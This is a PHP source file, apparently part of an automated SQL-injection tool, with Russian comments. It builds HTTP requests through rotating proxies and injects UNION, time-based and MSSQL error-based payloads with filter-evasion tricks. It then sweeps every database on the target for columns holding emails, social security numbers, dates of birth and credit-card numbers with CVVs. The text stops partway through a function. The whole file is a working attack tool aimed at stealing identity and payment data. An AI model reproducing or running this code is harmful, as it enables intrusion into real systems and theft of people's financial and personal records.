<?php


error_reporting(0);
//error_reporting(E_ALL);
set_time_limit(0);



class InjectorComponent {
	
	function __construct() {
		
		
		//parent::__construct();
			
		
		include($_SERVER["DOCUMENT_ROOT"]."/config.php");
		//$this->d($_SERVER['DOCUMENT_ROOT'].'/config.php','config');
		
	}
	
	
	
	
	////////////////////////////////////////////////////////////////
	/////////////////////sleep функции для sqli() /////////////////	
	////////////////////////////////////////////////////////////////
	
	
	
	function send_packet($packet,$type='all',$ret2='content'){


	if($this->proxy !=''  AND $this->proxy_enable == true)
	{
		
		$rand_keys = array_rand ($this->proxy);
		$s = explode(':',$this->proxy[$rand_keys]);
		//$this->d($s,'sleep_send_packet');
		
		
		$this->set['uproxy']=true;
		$this->set['phost']=trim($s[0]);
		$this->set['pport'] =trim($s[1]);
		$fp=@fsockopen($this->set['phost'],$this->set['pport']);
	}
	else
	{ 
		//$this->d('NO uproxy');
		$fp=@fsockopen($this->set['host'],80);
	}

	//$this->d($packet,'paket');
	
	
	//$this->d($this->set,'$this->set');
	
	if($fp)
	{
		//$this->d($this->set['host'].'  host!!');
		fwrite($fp,$packet);
		if($ret2=='time')$us['tmstrt']=time();
		$dt='';
		while(!feof($fp))
		{
			$dt.=fgets($fp);
			stream_set_timeout($fp, 15);
			
			
			$info = stream_get_meta_data($fp);
			if($info['timed_out'])
			{
				//return false;
				$this->set['timeout'] = 1;
			}
			
			if($type=='header'){

				if(strpos($dt,"\r\n\r\n"))break;
			}
		}
		fclose($fp);
		if($ret2=='time')
		{
			$us['tmstrt']=(time()-$us['tmstrt']);
			$dt=$us['tmstrt'];
		}
	}else
	{
		$this->d('sleep NIHUYA NE SKACAHLOS');
		$dt=false;
	}

	return $dt;
}
	
	function create_packet($path,$get='',$post='',$cookie='',$headers=array()){
	//global $this->set;

	if($this->debug_full_content==true){
		
		$this->d(urldecode($get),'$get create_packet start get urldecode');
	}
	
	
	
	
	if($this->h_s['inject']=='post'){
		
		$kk = $this->filter_url($this->h_s['url']);
		$tmp22 = parse_url('http://'.$kk);
		
		//$this->d($tmp22,'$tmp22');
		//exit;
		
		
		$path = $tmp22['path'];
		$post = $get;
		$get='';
	}
	
	
	$tmp['Accept-Language']='en-us,en';
	$tmp['Accept-Charset']='utf-8,*';
	$tmp['Accept']='text/html,image/jpeg,image/gif,text/xml,text/plain,image/png';
	$tmp['User-Agent']='Opera/9.27';
	if(!empty($cookie))$tmp['Cookie']=$cookie;
	if(!empty($post)){
		$tmp['Content-Type']='application/x-www-form-urlencoded';
		$tmp['Content-Length']=strval(strlen($post));
	}
	$tmp['Host']=$this->set["host"];
	$tmp['Connection']='close';

	foreach($headers as $key => $value){
		if(!empty($key)&&!empty($value))$tmp[$key]=$value;
	}

	if($this->https)
	{
		if(!empty($post))$header="POST ".$this->set["patch"].$path.'?'.$get." HTTPS/1.0\r\n";
		else $header="GET ".$this->set["path"].$path.'?'.$get." HTTPS/1.0\r\n";
		//$this->d($this->set["host"].$this->set["path"].$path.'?'.$get);
	}else{
		if(!empty($post))$header="POST ".$this->set["patch"].$path.'?'.$get." HTTP/1.0\r\n";
		else $header="GET ".$this->set["path"].$path.'?'.$get." HTTP/1.0\r\n";
		//$this->d($this->set["host"].$this->set["path"].$path.'?'.$get);
	}
	
	
	//$this->d($header,'$header');
	
	
	
	if($this->https){
		$this->set["scheme"] = 'https';
	}else{
		$this->set["scheme"] = 'http';
	}
	 $this->sqli['sqli_sleep'][] =  rawurldecode($this->set["scheme"].'://'.$tmp['Host'].$this->set["path"].$path.'?'.$get);
	 
	 $this->sqli['sqli_sleep_encode'][] =  $this->set["scheme"].'://'.$tmp['Host'].$this->set["path"].$path.'?'.$get;
	 
	
	foreach($tmp as $key => $value)
	{
		
		if(!empty($key)&&!empty($value))$header.=$key.': '.$value."\r\n";
		
	}
	$header.="\r\n";

	if(!empty($post))$header.=$post;
	
	
	if($this->debug_full_content==true){
		
		$this->d($header,'debug_full_content CREATE_PACKET ');
	}
	
	return $header;
}

	function create_sql($sql,$cnt='',$num='',$concat=true,$type='num'){


	$tmp='';
	if(empty($cnt))$cnt=$this->set['sleep']['columns'];
	if(empty($num))$num=$this->set['sleep']['outp'];

	for($i=1;$i<=$cnt;$i++)
	{

		if($num!=$i)
		{
			if($type=='num')$tmp.=$i.',';
			else $tmp.='NULL,';
		}else
		{
			if((!empty($this->set['sleep']['hex'])) && ($this->set['sleep']['hex']) AND $this->method_hex==false)$sql='UNHEX(HEX('.$sql.'))';
		//$sql='UNHEX(HEX('.$sql.'))';
			if($concat)$tmp.='CONCAT(0x6467797436,'.$sql.',0x21213566646B682121),';
			else $tmp.=$sql.',';
		}
	}
	
	
	//обрезаем запятую
	$tmp=substr($tmp,0,strlen($tmp)-1);
	return $tmp;
}

	function create_get($name,$value,$url=true,$dec = false){


	$tmp='';
	$tmp22='';
	
	//$this->d($name,'name');
	
	//$this->d($value,'value');
	
	
	 
	//exit;
	$this->key_sqli='';
	
	$this->key_sqli_element = '';
	
	
	foreach($this->set['query'] as $key => $val)
	{
		
		
	
	 //  $this->d($name,'name');
	
	   if($dec)
	   {	
			if($name!=$key)
			{
				$tmp.=$key.'='.$val.'&';
				$tmp22.=$key.'='.$val.'&';
			}
			else
			{
				$tmp.=$name.'='.($url?$value:$value).'&';
				$tmp22.=$name.'='.($url?$value:$value).'&';
			}
	   }else
	   {
	   
			if($name!=$key)
			{	
				//$this->d($key,'name CLEAN ');
		
                $tmp.=$key.'='.rawurlencode($val).'&';	
				//$tmp.=$key.'='.$val.'&';	
				$tmp22.=$key.'='.$val.'&';	
			}
			else
			{
				$this->key_sqli=$key;
				
				//$this->d($key,'name WHERE SQLI ');
                $tmp.=$name.'='.($url?rawurlencode($value):$value).'&';
				//$tmp.=$name.'='.$value.'&';
				$tmp22.=$name.'='.($url?$value:$value).'&';
			}	
	   }
	}
	
	
	
	
	
	
	
	
	
	$tmp=substr($tmp,0,strlen($tmp)-1);
	$tmp22=substr($tmp22,0,strlen($tmp22)-1);
	$this->tmp22 = $tmp22;
	
	
	
	$tmp_new = explode("&",$tmp);
	
	//$this->d($tmp_new,'$tmp_new');
	$kk = '';
	
	foreach($tmp_new as $nn)
	{
		
		$nn = str_replace('&&', '&', $nn);
		$nn = str_replace('?&', '?', $nn);
		$nn = str_replace('&', '', $nn);
		
		
		if(preg_match("/".$this->key_sqli."=/i",$nn))
		{
			$this->key_sqli_element=$nn;
			
		}else
		{
			
			
			$kk.= $nn.'&';
		}
	}
	
	
	if($this->key_sqli_element !=''){
		
		$kk =$kk.$this->key_sqli_element;
		
	}
	
	//$this->d($kk,'$kk ++++++++++');
	
	
	
	if($this->debug_full_content==true){
		
		$this->d($kk,'debug_full_content CREATE_GET ');
	}
	
	return $kk;
}

	function clear_sql($sql){
	//global $this->set,$this->sec;

	if($this->dumpfile==true){
		
		$sql = $this->mysqlDumperFilter($sql);
		
	}
	
	$sql=' '.$sql;
	
	if($this->set['sleep']['flt']['tp'])
	{
		if(($this->set['sleep']['flt']['sp'])&&(!$this->set['sleep']['flt']['ed']))
		{
			$sql=str_replace(' ','/**/',$sql);
			$sql=str_replace('--/**/d','--',$sql);
			$sql=str_replace('/**/AND/**/','&&',$sql);
			$sql=str_replace('/**/OR/**/','||',$sql);
		}

		if(($this->set['sleep']['flt']['sp'])&&($this->set['sleep']['flt']['ed']))
		{
			$sql=preg_replace('/SELECT (CONCAT[\w|\W]+?) FROM/','SEleCT(\1)FroM',$sql);
			$sql=preg_replace('/FROM ([\w|\W]+?) /','FroM`\1`',$sql);
			$sql=preg_replace('/WHERE ([\w\W]+?) (LImiT [\w|\W]+)?/','WHerE(`\1`)',$sql);
		}

		if($this->set['sleep']['flt']['an'])
		{
			$sql=str_replace('AND','&&',$sql);
			$sql=str_replace(' OR ',' || ',$sql);
			$sql=str_replace('*/OR/*','*/||/*',$sql);
			$sql=str_replace("'OR'","'||'" ,$sql);
			$sql=str_replace("OR(","||(" ,$sql);
		}

		if($this->set['sleep']['flt']['qt'])
		{
			$sql=str_replace("CHAR('58')","CHAR('::')",$sql);
			$sql=preg_replace('/\'([\w|\W]+?)\'/e','"0x".bin2hex("\1").""',$sql);
			$sql=str_replace('AND','&&',$sql);
			
			$sql=preg_replace('/OR[^DER]/','||',$sql);
		}
	}

	if(!$this->set['sleep']['flt']['sl'])$sql=str_replace('SLEEP('.$this->sec.')','BENCHMARK(2999999,MD5(NOW()))',$sql);
	if($this->set['sleep']['flt']['nl'])$sql=chr(0).$sql;
	if($this->set['sleep']['flt']['sq'])$sql="'".$sql;
	$sql=$this->ret['sleep']['val'].$sql;
	return $sql;
}

	function send_sql($sql,$parse=true,$debug=false){
	
	
	
	$tmp= $this->clear_sql('AND 1=2'.$this->set['sleep']['scb'].' uNiON all '.$sql.$this->set['sleep']['coment']);
	if($this->debug==true){$this->d($tmp,'clear_sql');}
	
	
	$tmp=$this->create_get($this->ret['sleep']['key'],$tmp);
	if($this->debug==true){$this->d($this->set['full'].$tmp,'set[full]+create_get');}
	//if($this->debug==true){$this->d($this->set['full'].$this->tmp22,'tmp22');}
	
	
	//exit;
	
	//if($debug)return $tmp;
	
	$kkk = $this->create_packet('',$tmp);
	
	$tmp=$this->send_packet($kkk);
	//$this->d($tmp,'send');
	
	//file_put_contents('./file_sleep.txt',$tmp);
	//exit;
		
	if($parse)
	{
		if(preg_match('/dgyt6([\w|\W]+?)!!5fdkh!!/',$tmp,$mth))	return $mth[1];
		else return false;
	}
	
	return $tmp;
}

	function parse_link($link){

	$tmp=parse_url($link);
	parse_str($tmp['query'],$tmp['query']);
	return $tmp;
}

	function GetBetween($content){//EB вычисляет, что находится между тэгов
    $r = explode(":oyu:", $content);
    if (isset($r[1])){
        $r = explode(":phz:", $r[1]);
        return $r[0];
  }
  return''; 
}
	
	//////////////////////////////////////////////////////////////////////////	
	
	
	
	
	////////////////////////////////////////////////////////////////
	/////////////////////БАЗОВЫЕ ДЛЯ ЗАПРОСОВ MSSQL/////////////////
	////////////////////////////////////////////////////////////////
	
	function mssqlGetValue($pole){//общая функция для MSSQL
		
		
		if($this->method==3)
		{
			//$this->d('tochka: method==10 SLEEP mysqlGetValueSleep');
			$get = $this->mssqlGetError($pole);
			if($get!==false)return $get;
			return false;

		}
		
		
		$method = $this->sposob;
		
		//$this->d($method,'$method = $this->sposob');

							
		$n = $this->variant_query_mssql[$this->sposob][$this->method][0];//начало запроса
		$k = $this->variant_query_mssql[$this->sposob][$this->method][1];//конец  запроса
		
		//$this->d($n,'начало запроса');
		//$this->d($k,'конец  запроса');
		
		//$this->d($this->column,'$this->column');
		//$this->d($this->work,'$this->work');
		
	
		$query = "1111111111111$n";//начальный запрос для НЕ sleep
		$query_mssql = "1111111111111$n";//начальный запрос для НЕ sleep
		
			
	
						
	
		if(!is_array($pole))$pole = array($pole);//это как раз наш запрос version к примеру
		
		$zapr = '';//общая строка для наших полей
		 
		//обволакиваем его спец символами, чтобы патом найти можно было бы
		foreach ($pole as $key=>$val)
		{
	  	
		 	if(count($pole)==1)
			{
				//если одно поле
		 		//$zapr .= 'CHAR('.$this->charcher('[X]').')'.','.$val.',CHAR('.$this->charcher('[XX]').')';
				
				$ku1 = $this->charcher_mssql('[X]');
				$ku2 = $this->charcher_mssql('[XX]');
	
				$zapr_mssql .=$ku1.'+'.$val.'+'.$ku2;
		 		
		 	}else
			{
				//если несколько найти надо
		 		//$zapr .= ',CHAR('.$this->charcher('['.$val.']').')'.','.$val.',CHAR('.$this->charcher('['.$val.']').')';
				
				
		 	}
	  	
		}
		
		//$this->d($zapr,'final $zapr');
		$this->d($zapr_mssql,'final $zapr_mssql');
		$zapr_mssql = urlencode($zapr_mssql);//url кодируем символы
		//$this->d($zapr_mssql,'final $zapr_mssql ENCODE');


		 $work_count = count($this->work);//рабочие поля где вывод есть
		
		 $new = array(); // Что на выходе

		 $give = 0;
		 
		 
		 //подставляем колонки
		 for($col=1;$col<=$this->column;$col++)
			{
				if($col==1){$zap='';}else{$zap=',';}//запятая
			
				if(in_array($col, $this->work) AND $give==0)
				{

					$p = $col-1;

					$give++;
					
					//$query .= $zap."CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)";
					
					$query_mssql .= $zap."$zapr_mssql";
					
					
				}else
				{
						
					if(is_array($order) AND count($pole)>1)
					{
						$query_mssql .= $zap."".$order[0];
					}else
					{
						$query_mssql .= $zap.$col;	
					}
				}	
			}
			
			
			//if($this->debug==true){$this->d($query_mssql,'$query_mssql');}
			
	
			if(is_array($order) AND count($pole)>1)
			{
				$order = '+order+by+`'.$order[0].'`+'.$order[1].'+';
			}else
			{
				$order = '';
			}
			
			
				
			
				if($this->desc ==0 AND $this->desc_enable == true)
				{
					//$order = 'ORDER by id DESC';
 					
					//$url1 = $this->url.$query.'+'.$from.'+'.$where.'+'.$order.'+limit+'.$limit.''.$k;
					
					$url1_mssql = $this->url.$query_mssql.$k;
					
				}else
				{
					//$url1 = $this->url.$query.'+'.$from.'+'.$where.'+'.$order.'+limit+'.$limit.'';
					
					$url1_mssql = $this->url.$query_mssql.$k;
					
				}

				
				
				
				$url1 = str_replace(',,', ',',$url1);
				$url1 = str_replace('++', '+',$url1);
				$url1 = str_replace('+++','+',$url1);
				
				
				
				if($this->debug==true){$this->d($url1_mssql,'$url1_mssql полный MSSQLGetValue');}
				
				$url1 = $url1_mssql;
				
				$file = $this->getContents($url1);
				
				//$this->d($file,'$file');
				
				
				if($this->mssql==true){
					file_put_contents('./file_mssql.txt',$file);

				}else{
					
					file_put_contents('./file.txt',$file);
				}
				
				
				//$this->d($file,'file');
				//exit;
				
				//ищем результаты	
				if(count($pole)==1) //если он один предполагается
				{
		 		
					preg_match_all("~\[X\](.*?)\[XX\]~is",$file,$arr);
					
					
					//$this->d($arr,'arr ONE');
					
					

					if(isset($arr[1][0]))return array($pole[0]=>$arr[1][0]);
					
					return false;
		 		
				}else//если не сколько полей было
				{
		 				
					foreach ($pole as $val)
					{
			 	
						preg_match_all("~\[{$val}\](.*?)\[{$val}\]~iS",$file,$arr);
						
						//$this->d("~\[{$val}\](.*?)\[{$val}\]~iS",'reg ALL');
						$this->d($arr,'arrA_LLL');
						
					
				
						if(isset($arr[1][0]))
						{
							$export[$val] = $arr[1][0];
						}else
						{
							$export[$val] = 'null';
						}
					}
				}
			
				if(preg_match('/is not able to access the database/i',$file)){
					
					$this->bad_body=$this->bad_body+1;
					
				}
			
			
			
			if(isset($export))
			{	
				return $export;
			}
			
			return false;
		
		
	}
	
	function mssqlGetError($pole){//дочерняя
		
		$string['']  = "+and+1=convert(int,($pole))";
		
		
		$sp = 0;
		
		
		
		foreach ($string as $key=> $val)
		{
			
			$str1 = $this->getContents($this->url.$val);
			
			$this->d($this->url.$val,'$this->url.$val');
			$this->d($str1,'$str1');
			//exit;
			
			if($str1 !=''){
			
				preg_match("~value \'(.*)\' to data type int~is",$str1,$arr);
				$this->d($arr,'$arr');
				return array($pole=>$arr[1]);
				//return $data["$pole"] = $arr[1];
		
				
			//$sp++;
			}
		}
		
			/**	
		if(is_array($pole)){
			
			
			foreach ($pole as $val){

				$url = $this->url.$this->get_by_error.'+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2C'.$val.'%2C0x27%2C0x7e%29+'.$from.'+'.$where.'+LIMIT+'.$limit.'%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+'.$this->get_by_error.'1'.$this->get_by_error.'%3D'.$this->get_by_error.'1';

			//	echo $url.'<br/>';
				
				$file = $this->getContents($url);
		
				preg_match_all("~\'(.*?)\' for key~",$file,$arr);
		
				$arr[1][0] = str_replace("'~1",'',$arr[1][0]);
				//$this->d($arr,'$arr 1');
				$new[$val] = $arr[1][0];
					
				
			}
			
			return $new;
			
		}else
		{

			$url = $this->url.$this->get_by_error.'+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%28'.$pole.'%2C0x27%2C0x7e%29+'.$from.'+'.$where.'+LIMIT+'.$limit.'%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+'.$this->get_by_error.'1'.$this->get_by_error.'%3D'.$this->get_by_error.'1';
		
			$file = $this->getContents($url);
			//echo $file;
		
			preg_match_all("~\'(.*?)\' for key~",$file,$arr);
			$arr[1][0] = str_replace("'~1",'',$arr[1][0]);
			
			//$this->d($arr,'$arr 2');
			return array($pole=>$arr[1][0]);
			
		}	
**/
		return false;
	}
	
	////////////////////////////////////////////////////////////////	
	/////////Функции определения конкретных параметров для MSSQL////
	////////////////////////////////////////////////////////////////
	
	
	
	
	
	function mssqlGetLikeEmail(){//поиск всех мыл во всех БД
		
		$this->mssqlGetDatabase();
		$this->d($this->database,'database');
		
		//$bd = $this->database;
		
		
		$bds = $this->mssqlGetAllBd();
		
		$this->d($bds,'$bds all');
		
		
		if(count($bds)==0 or $bds =='')return false;
		
		
		foreach($bds as $bd)
		{
		
		
			
		
			if(trim($bd) == 'master')continue;
			
			if(trim($bd) == 'tempdb')continue;
			
			if(trim($bd) == 'model')continue;
			
			if(trim($bd) == 'msdb')continue;
			
			if(trim($bd) == 'distribution')continue;
			
			if(trim($bd) == 'ReportServer')continue;
			
			if(trim($bd) == 'ReportServerTempDB')continue;
		
			$this->d($bd,'################ BD ###############');
			
			$mail = $this->charcher_mssql('%mail%');
			
			
			// /**/COLLATE DATABASE_DEFAULT  
			$count = $this->mssqlGetValue("(/**/sElEcT /**/cAsT(count(t.name) as char) as x /**/fRoM [".$bd."]..[sysobjects] t join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail)");
			
			$count = $count["(/**/sElEcT /**/cAsT(count(t.name) as char) as x /**/fRoM [".$bd."]..[sysobjects] t join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail)"];
			
			if(empty($count))$count = 0;
				if($count==0){
					$this->d($bd,' CONTINUE  - '.$pps);
					continue 1;}
				
			
			
			
			for ($i=0;$i<$count;$i++)
			{
				$table = $this->mssqlGetValue("(/**/sElEcT top 1 x /**/fRoM (/**/sElEcT /**/dIsTiNcT top $i (t.name) as x /**/fRoM [".$bd."]..[sysobjects] t FULL OUTER join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail order by x asc) sq order by x desc)");
				
				
				
				
				
				if(count($table) !=0 AND $table !='')
				{
					
					
					$table_one = $table["(/**/sElEcT top 1 x /**/fRoM (/**/sElEcT /**/dIsTiNcT top $i (t.name) as x /**/fRoM [".$bd."]..[sysobjects] t FULL OUTER join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail order by x asc) sq order by x desc)"];
					
					
					$column = $this->mssqlGetColumnsEmail($bd,$table_one);
					
					$this->d($column,$bd.':::'.$table_one);
					
					if(count($column) !=0 AND $column !='')
					{
						
						$mssql[$bd.':::'.$table_one.':::'.$column] = $bd.':::'.$table_one.':::'.$column;
							
					}
				}
			}
			//break;
		}	
			
	
		$mssql  = array_unique($mssql);
		
		//$this->d($mssql,'$mssql-tables');
		
		return $mssql;
		
		
		
	}
	
	function mssqlGetColumnsEmail($bd,$table){//Поиск колонки с мылами
		
		
			
		$mail = $this->charcher_mssql('%mail%');
		$table_new = $this->charcher_mssql($table);
		
		
		$qq = $this->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd.information_schema.columns where table_name ={$table_new} AND column_name like $mail order BY column_name  ASC) sq order BY column_name ASC)");
		

		
		return $qq["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd.information_schema.columns where table_name ={$table_new} AND column_name like $mail order BY column_name  ASC) sq order BY column_name ASC)"];
		
		
		
	}
	
	
	function mssqlGetLikeSsn(){//поиск всех snn во всех БД
		
		//$this->mssqlGetDatabase();
		
		
		$bds = $this->mssqlGetAllBd();
		
		$this->d($bds,'$bds all');
		
		
		if(count($bds)==0 or $bds =='')return false;
		
		
		
		$pass = array(
		'ssn',
		'dob',
		'social_security_number',
		'social-security-number',
		'socialsecuritynumber',
		'mmn');
		
		//$this->d($pass);
		
		
		foreach ($pass as $pps)
		{
			//$this->d($pps,'$pps');
		
			$mail = $this->charcher_mssql("%$pps%");
			
			foreach($bds as $bd)
			{
			
			
				
			
				if(trim($bd) == 'master')continue;
				
				if(trim($bd) == 'tempdb')continue;
				
				if(trim($bd) == 'model')continue;
				
				if(trim($bd) == 'msdb')continue;
				
				if(trim($bd) == 'distribution')continue;
				
				if(trim($bd) == 'ReportServer')continue;
				
				if(trim($bd) == 'ReportServerTempDB')continue;
			
				$this->d($bd,'################ BD ############### - '.$pps);
				
				
				
				// /**/COLLATE DATABASE_DEFAULT  
				$count = $this->mssqlGetValue("(/**/sElEcT /**/cAsT(count(t.name) as char) as x /**/fRoM [".$bd."]..[sysobjects] t join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail)");
				
				$count = $count["(/**/sElEcT /**/cAsT(count(t.name) as char) as x /**/fRoM [".$bd."]..[sysobjects] t join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail)"];
				
				if($this->bad_body == 30){
					$this->d('$this->bad_body = 30');
					return false;
				}
				
				
				if(empty($count))$count = 0;
				if($count==0){
					$this->d($bd,' CONTINUE  - '.$pps);
					continue 1;}
				
				//$count = $count+1;
				
				
				
				
				
				$this->d($count,$bd.'-'.$pps);
				
				
				for ($i=0;$i<$count;$i++)
				{
					$table = $this->mssqlGetValue("(/**/sElEcT top 1 x /**/fRoM (/**/sElEcT /**/dIsTiNcT top $i (t.name) as x /**/fRoM [".$bd."]..[sysobjects] t FULL OUTER join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail order by x asc) sq order by x desc)");
					
					
					
					
					
					if(count($table) !=0 AND $table !='')
					{
						
						
						$table_one = $table["(/**/sElEcT top 1 x /**/fRoM (/**/sElEcT /**/dIsTiNcT top $i (t.name) as x /**/fRoM [".$bd."]..[sysobjects] t FULL OUTER join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail order by x asc) sq order by x desc)"];
						
						
						$column = $this->mssqlGetColumnSsn($bd,$table_one,$mail);
						
						$this->d($column,$bd.':::'.$table_one);
						
						if(count($column) !=0 AND $column !='')
						{
							
							$mssql[$bd.':::'.$table_one.':::'.$column] = $bd.':::'.$table_one.':::'.$column;
								
						}
					}
				}
				//break;
			}	
				
		}
		$mssql  = array_unique($mssql);
		
		//$this->d($mssql,'$mssql-tables');
		
		return $mssql;
		
		
		
	}
	
	function mssqlGetColumnSsn($bd,$table,$like){//Поиск колонки с snn
		
		
			
		$mail = $this->charcher_mssql("%$like%");
		$table_new = $this->charcher_mssql($table);
		
		
		$qq = $this->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd.information_schema.columns where table_name ={$table_new} AND column_name like $mail order BY column_name  ASC) sq order BY column_name ASC)");
		

		
		return $qq["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd.information_schema.columns where table_name ={$table_new} AND column_name like $mail order BY column_name  ASC) sq order BY column_name ASC)"];
		
		
		
	}
	
	
	function mssqlGetLikeOrders(){//поиск всех колонок с картами во всех БД
		
		//$this->mssqlGetDatabase();
		//$this->d($this->database,'database');
		
		//$bd = $this->database;
		
		
		$bds = $this->mssqlGetAllBd();
		
		$this->d($bds,'$bds all');
		
		
		if(count($bds)==0 or $bds =='')return false;
		
		$pass = array(
		'cvv',
		'_card',
		'cvc',
		'card_num',
		'card num',
		'card_ccv',
		'credit_card',
		'card_number',
		'cccode',
		'expiration',
		'card_ccv',
		'cc_code',
		'cc_holder',
		'cc_type',
		'card_exp',
		'exp_card',
		'exp_year',
		'card_exp',
		'numcc',
		'ccnum',
		'cc_num',
		'cc num',
		'num_cc',
		'number_cc',
		'numbers_cc',
		'creditcard'
		);
		
		$this->d($pass);
		
		
		foreach ($pass as $pps)
		{
			$pss = trim($pps);
		
			$mail = $this->charcher_mssql("%$pps%");
			
			foreach($bds as $bd)
			{
			
			
				//$this->d($bd,'################ BD ###############');
			
				if(trim($bd) == 'master')continue;
				
				if(trim($bd) == 'tempdb')continue;
				
				if(trim($bd) == 'model')continue;
				
				if(trim($bd) == 'msdb')continue;
				
				if(trim($bd) == 'distribution')continue;
				
				if(trim($bd) == 'ReportServer')continue;
				
				if(trim($bd) == 'ReportServerTempDB')continue;
			
			
				$this->d($bd,'################ BD ############### - '.$pps);
				
				
				
				// /**/COLLATE DATABASE_DEFAULT  
				$count = $this->mssqlGetValue("(/**/sElEcT /**/cAsT(count(t.name) as char) as x /**/fRoM [".$bd."]..[sysobjects] t join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail)");
				
				$count = $count["(/**/sElEcT /**/cAsT(count(t.name) as char) as x /**/fRoM [".$bd."]..[sysobjects] t join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail)"];
				
				
				if($this->bad_body == 30){
					$this->d('$this->bad_body = 30');
					return false;
				}
				
				
					if(empty($count))$count = 0;
					if($count==0)
					{
						$this->d($bd,' CONTINUE  - '.$pps);
						continue 1;
					}
				
				
				
				
				for ($i=0;$i<$count;$i++)
				{
					$table = $this->mssqlGetValue("(/**/sElEcT top 1 x /**/fRoM (/**/sElEcT /**/dIsTiNcT top $i (t.name) as x /**/fRoM [".$bd."]..[sysobjects] t FULL OUTER join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail order by x asc) sq order by x desc)");
					
					
					
					
					
					if(count($table) !=0 AND $table !='')
					{
						
						
						$table_one = $table["(/**/sElEcT top 1 x /**/fRoM (/**/sElEcT /**/dIsTiNcT top $i (t.name) as x /**/fRoM [".$bd."]..[sysobjects] t FULL OUTER join [syscolumns] as c on t.id = c.id /**/wHeRe t.xtype = char(85) and c.name like $mail order by x asc) sq order by x desc)"];
						
						
						$column = $this->mssqlGetColumnOrsers($bd,$table_one,$mail);
						
						$this->d($column,$bd.':::'.$table_one);
						
						if(count($column) !=0 AND $column !='')
						{
							
							$mssql[$bd.':::'.$table_one.':::'.$column] = $bd.':::'.$table_one.':::'.$column;
								
						}
					}
				}
				
			}
			//break;			
		}		
	
		$mssql  = array_unique($mssql);
		
		//$this->d($mssql,'$mssql-tables');
		
		return $mssql;
		
		
		
	}
	
	function mssqlGetColumnOrsers($bd,$table,$like){//Поиск колонки с картой
		
		
			
		$mail = $this->charcher_mssql("%$like%");
		$table_new = $this->charcher_mssql($table);
		
		
		$qq = $this->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd.information_schema.columns where table_name ={$table_new} AND column_name like $mail order BY column_name  ASC) sq order BY column_name ASC)");
		

		
		return $qq["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd.information_schema.columns where table_name ={$table_new} AND column_name like $mail order BY column_name  ASC) sq order BY column_name ASC)"];
		
		
		
	}
	
	////
	
	
	function mssqlGetCount($bd,$table){// получение количества СТРОК у ТАБЛИЦЫ из определеной БД
		
		
		$mssql = $this->mssqlGetValue("(/**/sElEcT top 1 /**/cAsT(count(*) as char) /**/fRoM [{$bd}]..[{$table}])");	
		return $mssql["(/**/sElEcT top 1 /**/cAsT(count(*) as char) /**/fRoM [{$bd}]..[{$table}])"];
	}
	
	function mssqlGetColumns($bd,$table){//получение всех колонок у кокретной БД и ТАБЛИЦЫ
		
		$table_new = $this->charcher_mssql($table);
			
		
		$mssql_count = $this->mssqlGetValue("(/**/sElEcT top 1 /**/cAsT(count(*) as char) /**/fRoM [$bd]..[syscolumns] /**/wHeRe id=(/**/sElEcT id /**/fRoM [$bd]..[sysobjects] /**/wHeRe [name]={$table_new}))");	
		
		
		$count = $mssql_count["(/**/sElEcT top 1 /**/cAsT(count(*) as char) /**/fRoM [$bd]..[syscolumns] /**/wHeRe id=(/**/sElEcT id /**/fRoM [$bd]..[sysobjects] /**/wHeRe [name]={$table_new}))"]; 
		
		$this->d($count,'$mssql count tables!!');
		
		
		
		
		for ($i=0;$i<$count;$i++)
		{
			
			$qq = $this->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 /**/cAsT([name] as nvarchar) /**/fRoM [$bd]..[syscolumns] /**/wHeRe id=(/**/sElEcT id /**/fRoM [$bd]..[sysobjects] /**/wHeRe [name]=$table_new) and [name] not in (/**/sElEcT /**/dIsTiNcT top $i [name] /**/fRoM [$bd]..[syscolumns] /**/wHeRe id=(/**/sElEcT top 1 id /**/fRoM [$bd]..[sysobjects] /**/wHeRe [name]=$table_new)))");
			
			$mssql[] = $qq["(/**/sElEcT /**/dIsTiNcT top 1 /**/cAsT([name] as nvarchar) /**/fRoM [$bd]..[syscolumns] /**/wHeRe id=(/**/sElEcT id /**/fRoM [$bd]..[sysobjects] /**/wHeRe [name]=$table_new) and [name] not in (/**/sElEcT /**/dIsTiNcT top $i [name] /**/fRoM [$bd]..[syscolumns] /**/wHeRe id=(/**/sElEcT top 1 id /**/fRoM [$bd]..[sysobjects] /**/wHeRe [name]=$table_new)))"];
			
		}
		
		
		return $mssql;
		
		
	}
	
	function mssqlGetAllTables($bd){//получение ВСЕХ ТАБЛИЦ у конкретной БД
		
		
		
